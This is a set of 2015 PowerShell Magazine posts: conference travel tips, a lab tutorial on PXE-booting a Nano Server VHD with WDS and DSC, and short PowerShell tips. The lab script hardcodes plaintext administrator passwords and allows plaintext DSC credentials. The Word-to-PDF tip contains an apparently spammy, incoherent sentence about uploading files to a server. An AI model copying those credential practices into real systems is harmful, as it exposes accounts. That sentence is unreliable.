$3.50 during peak hours.  All taxis charge the same rate except for white Mercedes cabs, which charge slightly more (negligible for short distances) and black Chrysler cabs , which can be very expensive, starting from $65 per journey!\nPublic Transport The Microsoft office is a short walk from the Raffles Place MRT station.\nMass Rapid Transit (MRT) is the subway or metro system. It’s safe, clean, and easy to find due to the excellent directional signs throughout the city. You can also use city buses. To find MRT routes and times, download the Singapore Transit app. This app does not need a data connection.\nFor buses, download the SBS Transit app.\nIf you plan to take public transport often, buy an Ezylink card at any MRT information counter. You can use the card on MRT and buses.\nNOTE: Remember the elevator rule. Stay to the left unless you’re moving.\nFoods and Beverages Foods sold by vendors at hawker centers and food courts are clean, safe, and delicious, since they are heavily regulated by the government. If you’re nervous, square signs with each vendor’s hygiene grade (A = cleanest – D = Not clean) is posted on their walls. Stick with grades A and B.\nWhen dining at restaurants, remember that prices on the menu are never the final amount. Your bill will include a 10% service charge and 7% GST.\nAlcoholic drinks are heavily levied (taxed). Beers are $10-20, depending on the make of the beer and the location.\nCoffee and tea Singapore has excellent coffee. While you’re here, try the local coffee from Toast Box, Ya Kun and Wang’s. They’re interesting and inexpensive, 80c to SG$1.50, much cheaper than Starbucks (which is available throughout Singapore).\nNOTE: By default, local coffee in Singapore comes with condensed milk. If you don’t want it, be sure to tell them.\nTo sound like a local, here’s the lingo:\n Kopi/teh – black coffee/black tea with condensed milk Kopi/teh C – black coffee/black tea with evaporated milk and sugar Kopi/teh O – black coffee/black tea and sugar Kopi/teh O kosong – black coffee/black tea with no sugar  Extra instructions:\n Less sweet – siew dai Stronger – gao Cold/iced – peng  How do you order iced coffee with milk and less sugar? Kopi Si Peng Siew Dai. Try for yourself and go nuts.\nQuestions? Post them here or send mail to: PSConfAsiaTravel@singaporepowershell.org\nPlease monitor http://powershell.asia for the Travel page with updated information.\nThanks to June Blender at SAPIEN Technologies Inc. for formatting this post.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/06/30/powershell-conference-asia-2015-get-here-travel-tips/","tags":["News","Conferences"],"title":"PowerShell Conference Asia 2015 – Get-Here:  Travel Tips"},{"categories":["How To","PowerShell DSC"],"contents":"The goal of this article is to provide a more detailed step by step way of achieving what was recently presented in How to use WDS to PXE Boot a Nano Server VHD post on Nano Server team blog.\nLet’s have a look at the requirements to go through these steps. I’ll actually assume that:\n You should have already installed Hyper-V and have enough compute and storage resources available on your host. You’ve downloaded an ISO image of the Windows Server 2016 Technical Preview 2 (build 10074 from May 2015).  My test laptop is a Windows 10 Enterprise insider preview installed (build 10130).\nLet’s quickly summarize what steps are required to be able to deploy a Nano.vhd from WDS after a PXE boot:\n Create an Internal Hyper-V switch so that computers attached to it won’t impact your environment but can communicate with each other. Provision a Domain Controller virtual machine from the ISO file Configure the DC by:  Setting a static IP Address and assign it to the adapter bound to the Internal Hyper-V switch Installing the required Windows features and roles: Active Directory Domain Services, DHCP and DNS Server, and Windows Deployment Services (a.k.a. WDS) Configuring these features to be able to PXE boot from the boot.wim file available on the original ISO file and delivering the prepared Nano.vhd file as an image to be installed   Provision a new empty VM, PXE boot and install the Nano.vhd  Step 1 Prepare the Internal switch on Hyper-V and assign it a static IP address.\n# Create an internal switch on Hyper-V ($VMswitch = New-VMSwitch -Name \u0026#34;Internal-Test\u0026#34; -SwitchType Internal) # Set a static IP address on Hyper-V switch Get-NetAdapter | Where Name -eq \u0026#34;vEthernet ($($VMswitch.Name))\u0026#34; | Where InterfaceDescription -match \u0026#34;Hyper-V\\sVirtual\\sEthernet Adapter\u0026#34; | New-NetIPAddress -IPAddress 10.0.0.1 -PrefixLength 24 I’ve downloaded the required ISO into the Downloads folder of the logged on user. I’ll store it as a variable to be able to use it later on.\n# Set the path to ISO $iso = $ExecutionContext.SessionState.Path. GetUnresolvedProviderPathFromPSPath(\u0026#39;~/downloads/en_windows_server_technical_preview_2_x64_dvd_6687981.iso\u0026#39;) NB: The path is expanded and there’s no check whether the file exists or not.\nLet’s make sure that the integrity of the file is fine.\n# Integrity check of ISO file if ( (Get-FileHash -Path $ISO -Algorithm SHA256 -ErrorAction SilentlyContinue).Hash -eq \u0026#39;D8D841393F661E30D448D2E6CBCEE20A94D9A57A94695B64EE76CA6B0910F849\u0026#39; ){ Write-Information -Msg \u0026#34;Got the correct Technical Preview 2 ISO file\u0026#34; -InfA 2 } else { Write-Warning -Message \u0026#34;Don\u0026#39;t have the correct ISO of the Technical Preview 2\u0026#34; break } The Msg parameter name is the alias for MessageData and InfA is the alias for InformationAction.\nLet’s also prepare a Nano.vhd file that will be copied to the DC1 disk and proposed as an installation image by the PXE server.\nTo create this Nano.vhd file, you can either follow the Getting Started with Nano Server guide, or you can use the new PowerShell Script to build your Nano Server Image. I’ll use the latter.\nThat said, first download the required scripts:\n# Download scripts requirements @( @{ URI = \u0026#39;http://blogs.technet.com/cfs-filesystemfile.ashx/__key/telligent-evolution-components-attachments/01-10474-00-00-03-65-09-88/NanoServer.ps1\u0026#39;; SHA1 = \u0026#39;27C00A02B49F3565783051B95D82498F17F74D57\u0026#39; ; }, @{ URI = \u0026#39;https://gallery.technet.microsoft.com/scriptcenter/Convert-WindowsImageps1-0fe23a8f/file/59237/7/Convert-WindowsImage.ps1\u0026#39;; SHA1 = \u0026#39;4B91A8ED09BD1E9DB5C63C8F63BB2BA83567917C\u0026#39; ; } ) | ForEach-Object -Process { $f = ([system.uri]$($_.URI)).Segments[-1] ; $o = (Join-Path ~/Downloads -ChildPath $f) ; if(-not((Get-FileHash -Path $o -Algorithm SHA1 -ErrorAction SilentlyContinue).Hash -eq $_.SHA1)) { try { $null = Invoke-WebRequest -Uri $($_.URI) -OutFile $o -ErrorAction Stop Unblock-File $o -ErrorAction Stop Write-Information -Msg \u0026#34;Successfully downloaded the correct version of $f file\u0026#34; -InfA 2 } catch { Write-Warning -Message \u0026#34;There was a problem downloading the $f file\u0026#34; } } else { Write-Information -Msg \u0026#34;Successfully found the correct version of $f file\u0026#34; -InfA 2 } } # Dot-sourcing functions inside a script . ~/Downloads/Convert-WindowsImage.ps1 # Fix hard-coded path in the script (Get-Content -Path ~/Downloads/NanoServer.ps1 -ReadCount 1 -ErrorAction Stop) -replace [regex]::Escape(\u0026#39;. .\\Convert-WindowsImage.ps1\u0026#39;),\u0026#34;\u0026#34; | Set-Content -Path ~/Downloads/NanoServer.ps1 -Encoding UTF8 -ErrorAction Stop # Load the modified version . ~/Downloads/NanoServer.ps1 Step 2\nTo provision the Domain Controller, I’ll use 3 techniques: the post-installation script setupcomplete.cmd that runs at the end of the specialize phase, the unattend.xml file, and PowerShell Desired Configuration to achieve the equivalent of a DCPromo. The main idea here is to move all artifacts (DSC modules, boot.wim, the prepared nano.vhd file…) required for configuring both the Domain Controller and WDS (Windows Deployment Services) into the VHD of the domain controller.\n# Mount ISO Mount-DiskImage -ImagePath $iso -StorageType ISO -Access ReadOnly -PassThru $dl = (Get-DiskImage -ImagePath $iso | Get-Volume).DriveLetter # Define VM Name $VM = \u0026#34;DC1-test\u0026#34; # Set parent VHD $ServerVHD = (Join-Path -Path ((Get-VMHost).VirtualHardDiskPath) -ChildPath \u0026#34;$VM.vhd\u0026#34;) # Create parent VHD # Convert the WIM file to a VHD using the loaded Convert-WindowsImage function if (-not(Test-Path -Path $ServerVHD -PathType Leaf)) { Convert-WindowsImage -Sourcepath \u0026#34;$($dl):\\sources\\install.wim\u0026#34; ` -VHD $ServerVHD ` -VHDformat VHD -Edition \u0026#34;Windows Server 2012 R2 SERVERSTANDARD\u0026#34; ` -VHDPartitionStyle MBR -Verbose:$true } Write-Information -Msg \u0026#34;Created parent VHD: size = $(\u0026#39;{0:N2} GB\u0026#39; -f ((Get-Item $ServerVHD).Length/1GB))\u0026#34; -InfA 2 # Create child VHD $cvp = (Join-Path -Path ((Get-VMHost).VirtualHardDiskPath) -ChildPath \u0026#34;$VM-child.vhd\u0026#34;) $childVHD = New-VHD -Path $cvp -ParentPath $ServerVHD -Differencing # Create a VM Gen 1 New-VM -Name $VM -MemoryStartupBytes 2048MB -NoVHD -SwitchName Internal-Test -Generation 1 # Attach disk Get-VM $VM | Add-VMHardDiskDrive -Path $childVHD.Path # Increase processor count for DC Get-VM $VM | Set-VMProcessor -Count 2 # Mount the VHD $cm = Mount-VHD -Path $childVHD.Path -Passthru $cml = (Get-Disk $cm.DiskNumber | Get-Partition | Where DriveLetter | Select -First 1).DriveLetter # Prepare a Nano VHD with the new script $bdir = Join-Path (Split-Path $iso -Parent) -ChildPath \u0026#34;Base\u0026#34; if (-not(Test-Path -Path $bdir -PathType Container)) { mkdir $bdir } $admincred = Get-Credential -Message \u0026#39;Admin password of your Nano image\u0026#39; -UserName \u0026#39;Administrator\u0026#39; $nnHT = @{ ComputerName = \u0026#39;Nano-PXE\u0026#39; ; MediaPath = \u0026#34;$($dl):\\\u0026#34; ; BasePath = $bdir ; # The location for the copy of the source media TargetPath = \u0026#34;$bdir\\Target\u0026#34; ; # The location of the final, modified image Language = \u0026#39;en-US\u0026#39; ; # The language locale of the packages GuestDrivers = $true ; # Add the Guest Drivers package (enables integration of Nano Server with Hyper-V when running as a guest). EnableIPDisplayOnBoot = $true ; # Configures the image to show the output of \u0026#39;ipconfig\u0026#39; on every boot AdministratorPassword = $admincred.Password ; } New-NanoServerImage @nnHT # Setupcomplete.cmd file $s = @\u0026#39; @echo off :: Define a static IP for the DC netsh int ip set address name=\u0026#34;Ethernet\u0026#34; source=static address=10.0.0.10/24 gateway=10.0.0.1 :: Configure the DNS client netsh dns set dnsservers name=\u0026#34;Ethernet\u0026#34; source=static address=10.0.0.10 validate=no \u0026#39;@ mkdir \u0026#34;$($cml):\\Windows\\Setup\\Scripts\u0026#34; $s | Out-File -FilePath \u0026#34;$($cml):\\Windows\\Setup\\Scripts\\setupcomplete.cmd\u0026#34; -Encoding ASCII # Unattend.xml $unattendDC1 = @\u0026#39; \u0026lt;xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;unattend xmlns=\u0026#34;urn:schemas-microsoft-com:unattend\u0026#34;\u0026gt; \u0026lt;settings pass=\u0026#34;oobeSystem\u0026#34;\u0026gt; \u0026lt;component name=\u0026#34;Microsoft-Windows-Shell-Setup\u0026#34; processorArchitecture=\u0026#34;amd64\u0026#34; publicKeyToken=\u0026#34;31bf3856ad364e35\u0026#34; language=\u0026#34;neutral\u0026#34; versionScope=\u0026#34;nonSxS\u0026#34; xmlns:wcm=\u0026#34;http://schemas.microsoft.com/WMIConfig/2002/State\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34;\u0026gt; \u0026lt;UserAccounts\u0026gt; \u0026lt;AdministratorPassword\u0026gt; \u0026lt;Value\u0026gt;UABAAHMAcwB3ADAAcgBkAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAUABhAHMAcwB3AG8AcgBkAA==\u0026lt;/Value\u0026gt; \u0026lt;PlainText\u0026amp;gt;false\u0026amp;lt;/PlainText\u0026gt; \u0026lt;/AdministratorPassword\u0026gt; \u0026lt;/UserAccounts\u0026gt; \u0026lt;RegisteredOwner\u0026gt;Tuva user\u0026lt;/RegisteredOwner\u0026gt; \u0026lt;RegisteredOrganization\u0026amp;gt;NanoRocks\u0026amp;lt;/RegisteredOrganization\u0026gt; \u0026lt;/component\u0026gt; \u0026lt;component name=\u0026#34;Microsoft-Windows-International-Core\u0026#34; processorArchitecture=\u0026#34;amd64\u0026#34; publicKeyToken=\u0026#34;31bf3856ad364e35\u0026#34; language=\u0026#34;neutral\u0026#34; versionScope=\u0026#34;nonSxS\u0026#34; xmlns:wcm=\u0026#34;http://schemas.microsoft.com/WMIConfig/2002/State\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34;\u0026gt; \u0026lt;SystemLocale\u0026amp;gt;en-US\u0026amp;lt;/SystemLocale\u0026gt; \u0026lt;InputLocale\u0026amp;gt;0409:0000040c\u0026amp;lt;/InputLocale\u0026gt; \u0026lt;UILanguage\u0026amp;gt;en-US\u0026amp;lt;/UILanguage\u0026gt; \u0026lt;UserLocale\u0026amp;gt;en-US\u0026amp;lt;/UserLocale\u0026gt; \u0026lt;/component\u0026gt; \u0026lt;/settings\u0026gt; \u0026lt;settings pass=\u0026#34;specialize\u0026#34;\u0026gt; \u0026lt;component name=\u0026#34;Microsoft-Windows-Shell-Setup\u0026#34; processorArchitecture=\u0026#34;amd64\u0026#34; publicKeyToken=\u0026#34;31bf3856ad364e35\u0026#34; language=\u0026#34;neutral\u0026#34; versionScope=\u0026#34;nonSxS\u0026#34; xmlns:wcm=\u0026#34;http://schemas.microsoft.com/WMIConfig/2002/State\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34;\u0026gt; \u0026lt;ComputerName\u0026amp;gt;DC1-test\u0026amp;lt;/ComputerName\u0026gt; \u0026lt;/component\u0026gt; \u0026lt;component name=\u0026#34;Microsoft-Windows-DNS-Client\u0026#34; processorArchitecture=\u0026#34;amd64\u0026#34; publicKeyToken=\u0026#34;31bf3856ad364e35\u0026#34; language=\u0026#34;neutral\u0026#34; versionScope=\u0026#34;nonSxS\u0026#34; xmlns:wcm=\u0026#34;http://schemas.microsoft.com/WMIConfig/2002/State\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34;\u0026gt; \u0026lt;DNSSuffixSearchOrder\u0026gt; \u0026lt;DomainName wcm:action=\u0026#34;add\u0026#34; wcm:keyValue=\u0026#34;1\u0026#34;\u0026amp;gt;10.0.0.10\u0026amp;lt;/DomainName\u0026gt; \u0026lt;/DNSSuffixSearchOrder\u0026gt; \u0026lt;/component\u0026gt; \u0026lt;component name=\u0026#34;Microsoft-Windows-UnattendedJoin\u0026#34; processorArchitecture=\u0026#34;amd64\u0026#34; publicKeyToken=\u0026#34;31bf3856ad364e35\u0026#34; language=\u0026#34;neutral\u0026#34; versionScope=\u0026#34;nonSxS\u0026#34; xmlns:wcm=\u0026#34;http://schemas.microsoft.com/WMIConfig/2002/State\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34;\u0026gt; \u0026lt;Identification\u0026gt; \u0026lt;JoinWorkgroup\u0026gt;test.local\u0026amp;lt;/JoinWorkgroup\u0026gt; \u0026lt;/Identification\u0026gt; \u0026lt;/component\u0026gt; \u0026lt;/settings\u0026gt; \u0026lt;cpi:offlineImage cpi:source=\u0026#34;wim:c:/iso.6687981/sources/install.wim#Windows Server 2012 R2 SERVERSTANDARDCORE\u0026#34; xmlns:cpi=\u0026#34;urn:schemas-microsoft-com:cpi\u0026#34; /\u0026gt; \u0026lt;/unattend\u0026gt; \u0026#39;@ $unattendDC1 | Out-File -FilePath \u0026#34;$($cml):\\Unattend.xml\u0026#34; -Encoding UTF8 # Get required DSC resource if (-not (Get-Module -ListAvailable -Name xActiveDirectory)) { Find-Module -Name xActiveDirectory -Repository PSGallery | Install-Module -Verbose } # Define environment $ConfigData = @{ AllNodes = @( @{ NodeName = \u0026#39;localhost\u0026#39;; PSDscAllowPlainTextPassword = $true; RequiredFeatures = @( @{ Name = \u0026#39;DHCP\u0026#39;} @{ Name = \u0026#39;DNS\u0026#39;} @{ Name = \u0026#39;WDS\u0026#39;} @{ Name = \u0026#39;RSAT-DHCP\u0026#39;} @{ Name = \u0026#39;RSAT-DNS-Server\u0026#39;} @{ Name = \u0026#39;WDS-AdminPack\u0026#39;} ) DCAdminPassword = New-Object pscredential -ArgumentList \u0026#39;nanorocks\\administrator\u0026#39;, (ConvertTo-SecureString -String \u0026#39;P@ssw0rd\u0026#39; -Force -AsPlainText) SafeAdminPassword = New-Object pscredential -ArgumentList \u0026#39;Password Only\u0026#39;, (ConvertTo-SecureString -String \u0026#39;Azerty@123\u0026#39; -Force -AsPlainText) } ) } # DSC config Configuration DCConfig { Param() Import-DscResource -ModuleName xActiveDirectory Node localhost { LocalConfigurationManager { RebootNodeIfNeeded = $true; } WindowsFeature ADDS { Name = \u0026#39;AD-Domain-Services\u0026#39;; Ensure = \u0026#39;Present\u0026#39;; } foreach ($f in $Node.RequiredFeatures) { WindowsFeature $f.Name { Name = $f.Name ; Ensure = \u0026#39;Present\u0026#39;; } } xADDomain DSDC1 { DomainName = \u0026#39;nanorocks.local\u0026#39;; DomainAdministratorCredential = $Node.DCAdminPassword SafemodeAdministratorPassword = $Node.SafeAdminPassword DependsOn = \u0026#39;[WindowsFeature]ADDS\u0026#39;; } } } # Compile config into MOF file if (-not(Test-Path -Path ~/Documents/DSC) ){ mkdir ~/Documents/DSC } DCConfig -outputPath ~/Documents/DSC -ConfigurationData $ConfigData # Copy DSC resource $cHT = @{ Path = \u0026#39;C:\\Program Files\\WindowsPowerShell\\Modules\\xActiveDirectory\u0026#39;; Destination = \u0026#34;$($cml):\\Program Files\\WindowsPowerShell\\Modules\\xActiveDirectory\u0026#34; } Copy-Item @cHT -Recurse -Force # Copy DSC config Copy-Item -Path ~/documents/DSC/*.mof -Destination \u0026#34;$($cml):\\Users\\Public\\Documents\u0026#34; # Copy original boot image from ISO Copy-Item -Path \u0026#34;$($dl):\\Sources\\boot.wim\u0026#34; -Destination \u0026#34;$($cml):\\Users\\Public\\Documents\u0026#34; # Copy prepared Nano.vhd Copy-Item -Path \u0026#34;$bdir\\Target\\*.VHD\u0026#34; -Destination \u0026#34;$($cml):\\Users\\Public\\Documents\u0026#34; # Unmount ISO file Get-DiskImage -ImagePath $iso | Dismount-DiskImage # Unmount VHD Dismount-VHD -Path $childVHD.Path Start-Vm -VMName $vm After a few minutes, the operating system of the Domain Controller is ready.\nStep 3 Let’s promote it as DC with the DSC (Desired State Configuration)\n# DCPromo over PowerShell Direct Invoke-Command -VMName $VM -Credential (Get-Credential \u0026#39;test.local\\administrator\u0026#39;) -ScriptBlock { Set-DscLocalConfigurationManager C:\\Users\\Public\\Documents Start-DscConfiguration C:\\Users\\Public\\Documents -Verbose -Wait exit } As I’m on a Windows 10 Hyper-V, I can leverage PowerShell Direct recently introduced, so that I don’t rely on the network stack.\nOnce the DC has rebooted, I can start configuring the features I provisioned:\n# Post-install Invoke-Command -VMName $VM -Credential (Get-Credential \u0026#39;nanorocks\\administrator\u0026#39;) -ScriptBlock { # DHCP configuration # Authorize if (-not(Get-DhcpServerInDC | Where DnsName -eq \u0026#34;$($env:computername).$($env:USERDNSDOMAIN)\u0026#34;)) { Add-DhcpServerInDC } else { Get-DhcpServerInDC } # Scope Add-DhcpServerv4Scope -StartRange 10.0.0.20 -EndRange 10.0.0.100 -Name \u0026#34;Nano scope\u0026#34; -State Active -SubnetMask 255.255.255.0 # Activate (done with Add-DhcpServerv4Scope -State param # WDS mkdir C:\\RemoteInstall wdsutil /verbose /progress /initialize-server /RemInst:c:\\RemoteInstall # /Authorize wdsutil /start-server wdsutil /verbose /progress /set-server /AnswerClients:ALL Import-WdsBootImage -Path C:\\Users\\Public\\Documents\\boot.wim dir C:\\Users\\Public\\Documents\\*.vhd | Import-WdsInstallImage } Step 4 Let’s now create a new VM. To be able to boot over PXE on a Generation 1 virtual machine its network adapter should be a legacy network card.\n# Create test VM Generation 1 and add legacy network card for PXE boot $testVM = \u0026#39;Nano-test-pxe\u0026#39; New-VHD -Path (Join-Path -Path ((Get-VMHost).VirtualHardDiskPath) -ChildPath \u0026#34;$($testVM).vhdx\u0026#34;) -Dynamic -SizeBytes 127GB New-VM -VMName $testVM -Generation 1 -MemoryStartupBytes 1024MB -NoVHD -SwitchName Internal-test | Remove-VMNetworkAdapter Get-VM -VMName $testVM | Add-VMNetworkAdapter -IsLegacy:$true -SwitchName \u0026#39;Internal-test\u0026#39; Get-VM -VMName $testVM | Add-VMHardDiskDrive -Path (Join-Path -Path ((Get-VMHost).VirtualHardDiskPath) -ChildPath \u0026#34;$($testVM).vhdx\u0026#34;) Start-VM -VMName $testVM Step 5 Press F12 to PXE boot.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/06/29/how-to-use-wds-to-pxe-boot-a-nano-server-vhd-with-powershell-2/","tags":["How To","PowerShell DSC"],"title":"How to use WDS to PXE Boot a Nano Server VHD with PowerShell"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or later.\nI had recently completed writing a PowerShell module for an internal project. Within this module, I ended up using variables in the Script scope to share data between different parts of the module. Now, as the module grew into multi-hundred line script, I had a tough time finding all variables that were declared or used in the Script scope. It was important for me to ensure that these are used and disposed correctly.\nPowerShell AST to the rescue! The VariableExpressionAst gives us a peek into the variables in a script.\n$AbstractSyntaxTree = [System.Management.Automation.Language.Parser]::ParseInput($psISE.CurrentFile.Editor.Text, [ref]$null, [ref]$null) $Variables = $AbstractSyntaxTree.FindAll({$args[0] -is [System.Management.Automation.Language.VariableExpressionAst ]}, $true) $variables | Where-object { $_.VariablePath.IsScript } | Select -Unique In the last line of code, by replacing $.VariablePath.IsScript_ with _$_.VariablePath.IsGlobal_, we can find all variables in the Global scope.\nAlso, in my scenario, I was using PowerShell ISE for script editing and it was easy for me to use the ISE object model to grab the script content. If you have a file on the disk, you can use the Get-Content cmdlet to read the script content instead of $psISE.CurrentFile.Editor.Text.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/06/22/pstip-find-variables-in-a-script/","tags":["Tips and Tricks"],"title":"#PSTip Find variables in a script"},{"categories":["News"],"contents":"PowerShell Conference Asia 2015 is coming up fast so here’s a quick update on all the incredible speakers we’ve got lined up already.\nAfter we sent out the call for speakers and sponsors we had an awesome response. We’ve had community members, MVPs and even the PowerShell Product Team put their hand up to be there and present the latest and greatest in PowerShell to you.\nNow that we’re rapidly approaching the second half of the year a lot of people have been contacting us keen to know how they can register. We’ve been really overwhelmed with interest and support from the whole APAC Community, so thank you for that.\nHere’s an overview of the current arrangements and plans\nPlatinum Sponsor We are extremely pleased to announce officially that SAPIEN Technologies are going to be our platinum sponsor for this event! SAPIEN have long supported the PowerShell community and make some of the best tools on the market. With amazing folks like Ferdinand Rios, David Corrales, and June Blender, SAPIEN are hugely influential in the PowerShell community. We can’t thank them enough for helping to make this event happen. SAPIEN will be present for both days and we look forward to welcoming them.\nSpeakers Our line-up of speakers looks fantastic so far. We are still finalising the schedule but some of the people include:\n Gokan Ozcifci (MVP – Belgium: Founder and Managing Consultant at Neoxy. Microsoft SharePoint MVP. MCT. TechNetTR leader. Community Warrior and TN Wiki Addict), Session title: Managing SLA’s in SharePoint with PowerShell and creating a custom PowerShell Framework for SharePoint Senthamil Selvan (MVP – Singapore: Windows Consumer Apps MVP), Session title: Administering SharePoint Online with PowerShell Janaka Rangama (Sri Lanka: Technical Consultant at Infront Consulting where he designs solutions for enterprise clients, shaping businesses towards the hybrid cloud with System Center, Azure \u0026amp; Office 365.) – Session title: Azure Automation Punit Ganshani (MVP – Singapore: Microsoft .NET MVP, a geek, founder of KonfDB, book author and speaker in various forums in Asia, UK, Brazil, and US. He has designed and developed several hybrid Enterprise Applications, open-source frameworks, tools and Mobile Applications.) – Session title: Leveraging .NET with PowerShell including Classes, Types and References Deepak Dharmi (MVP – India: Microsoft MVP [PowerShell] with a zeal to understand and automate. Trying his hands on automating the daily tasks and getting wiser in the process) – **Session title: **DevOps Scenarios using DSC \u0026amp; Chef Ravikanth Chaganti (MVP – India: Multi-year recipient of Microsoft MVP award in Windows PowerShell and a published author. He is the founder of PowerShell Magazine and Learning PowerShell. He works at Dell Inc. and is a technologist for Microsoft UC\u0026amp;C and Private Cloud solutions.) **Session title: **Desired State Configuration and Infrastructure as Code. Desmond Lee (MVP – Switzerland: Specializes in end-to-end enterprise infrastructure and cloud solutions, recognized as an MVP for Skype for Business/Lync Server. An established speaker at major international and regional events and contributes frequently to several highly rated publications) – **Session title: **Skype \u0026amp; Lync Management with PowerShell Ryan Yates (UK: SharePoint IT Pro based at one of the World leading UK Universities. Co-Developer of SharePointPowerShell hosted on CodePlex) – **Session title: **SharePoint \u0026amp; Office365 management Girish Prakash (India: Working as Principal Engineer at Dell India R\u0026amp;D Center. 18+ years of software industry experience. Worked on Microsoft Technologies : COM/DCOM, MFC, Windows Debugging, .NET Framework, PowerShell) – **Session title: **The Power of Creating PowerShell Providers Ritesh Modi (Solutions Architect : Microsoft India) – **Session title: **Desired State Configuration, Service Management Automation TBC PowerShell Team Members!! – They build the Product!! More to be announced …  I’m sure you’ll agree with this calibre of speakers this will be an incredible Powershell community event but that’s not all. If you can arrange to stay an extra day you’ll be able to experience the excitement of the Singapore F1 Grand Prix. What a way to wrap up the week!\nWhat about Registration? We have opened up registration on EventBrite and you can register now!\nWe are accepting payment by PayPal and registration is not confirmed until payment is made. For this awesome event we are asking the lowest price we can. As you appreciate, events like this do take funds to make them happen and they don’t happen without the community, after all this is who it’s for. So what do you get for your money?\n 2 days of intense sessions with international speakers teaching real, valuable content and skills. This is not a Marketing event. Breakfast, lunch, and afternoon tea on both days T-shirt and sponsor giveaways Entry to the Closing Party on Saturday evening (food \u0026amp; drinks included) Connect with other PowerShell enthusiasts in the region Network with peers, MVPs, speakers, and the PowerShell Team!  If you have any questions or need help arranging travel and accommodation details please let us know through our Facebook Group. We’re really excited to see you there in September.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/06/17/powershell-conference-asia-2015-update-registration-is-open/","tags":["News","Conferences"],"title":"PowerShell Conference Asia 2015 Update – Registration is Open!"},{"categories":["Tips and Tricks"],"contents":"The Word.Application object can be used to convert Word documents into PDF files using soda pdf software, is handy and convenient, has privacy/security as you need to upload your files to the developer’s server. This requires Microsoft Word to be installed on the system on which the code is executed. Using the SaveAs method in the following code it is possible to rename and convert a file:\n$Word = New-Object -ComObject \u0026#34;Word.Application\u0026#34; ($Word.Documents.Open(\u0026#39;c:\\temp\\file.docx\u0026#39;)).SaveAs([ref]\u0026#39;c:\\temp\\file.pdf\u0026#39;,[ref]17) $Word.Application.ActiveDocument.Close() Using this technique it is also possible to convert the documents in an entire folder:\n$Word = New-Object -ComObject \u0026#34;Word.Application\u0026#34; Get-ChildItem -Path C:\\Temp -File -Filter *.docx | ForEach-Object { $NewName = $_.FullName -replace \u0026#39;docx\u0026#39;,\u0026#39;pdf\u0026#39; ($Word.Documents.Open($_.FullName)).SaveAs([ref]$NewName,[ref]17) $Word.Application.ActiveDocument.Close() } ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/06/11/pstip-convert-docx-to-pdf-using-word-application/","tags":["Tips and Tricks"],"title":"#PSTip Convert .docx to .pdf using Word.Application"},{"categories":["Tips and Tricks"],"contents":"In the previous #PSTip Compress files and folders with System.IO.Compression.FileSystem class, a .zip file was created and extracted. Now it might be good to know the compression ratio to see how much storage space has been saved by compressing the files. Using a ForEach-Object loop in combination with the Open method of this class we can determine the total size, compressed size, and the ratio of compression of a .zip file.\n[System.IO.Compression.ZipFile]::Open(\u0026#34;c:\\testing\\colorcopy\\yourfile.zip\u0026#34;,\u0026#39;Read\u0026#39;) | ForEach-Object { $_.Entries | ForEach-Object -Begin { [long]$TotalCompressed = $null [long]$TotalSize = $null } -Process { $TotalCompressed += $_.CompressedLength $TotalSize += $_.Length } -End { [pscustomobject]@{ FileSize = $TotalSize CompressedSize = $TotalCompressed Ratio = \u0026#34;{0:P2}\u0026#34; -f ($TotalCompressed / $TotalSize) } } } ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/06/10/pstip-determine-compression-ratio-of-compressed-files/","tags":["Tips and Tricks"],"title":"#PSTip Determine compression ratio of compressed files"},{"categories":["Tips and Tricks"],"contents":"Using the CreateFromDirectory and ExtractToDirectory methods, it is possible to compress and extract files. In this tip I will show different constructors that can be used to either compress or extract files using this class. The following example will compress the files stored in the c:\\testing folder:\nAdd-Type -Assembly \u0026#39;System.IO.Compression.FileSystem\u0026#39; [System.IO.Compression.ZipFile]::CreateFromDirectory(\u0026#39;c:\\testing\u0026#39;, \u0026#39;c:\\testing.zip\u0026#39;,\u0026#39;Optimal\u0026#39;,$false) When you want to extract files, use the ExtractToDirectory method:\n[System.IO.Compression.ZipFile]::ExtractToDirectory(\u0026#39;c:\\testing.zip\u0026#39;, \u0026#39;c:\\newtest\u0026#39;) In PowerShell 5.0 the Compress-Archive and Expand-Archive cmdlets are available to simplify working with compressed archives.\nFor more information about the ZipFile class and the Compress-Archive and Expand-Archive cmdlets please refer to the following articles:\nZipFile Class\nCompress-Archive\nExpand-Archive\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/06/09/pstip-compress-files-and-folders-with-system-io-compression-filesystem-class/","tags":["Tips and Tricks"],"title":"#PSTip Compress files and folders with System.IO.Compression.FileSystem class"},{"categories":["Tips and Tricks"],"contents":"By using the Windows() method and the LocationURL and LocationName properties we can programmatically determine which folder is open in File Explorer.\n$ShellApp = New-Object -ComObject Shell.Application $ShellApp.Windows() | Where-Object {$_.Name -eq \u0026#39;File Explorer\u0026#39;} | Select-Object LocationName,LocationURL The Where-Object statement is required to filter out results from Internet Explorer. If you are interested in all results including the open Internet Explorer windows and tabs the Where-Object statement can be omitted.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/06/08/pstip-use-shell-application-to-determine-which-folder-is-open-in-file-explorer/","tags":["Tips and Tricks"],"title":"#PSTip Use Shell.Application to determine which folder is open in File Explorer"},{"categories":["Tips and Tricks"],"contents":"Using the ADSI type accelerator in combination with WinNT provider we can retrieve the last logon time for a local account from the local SAM account 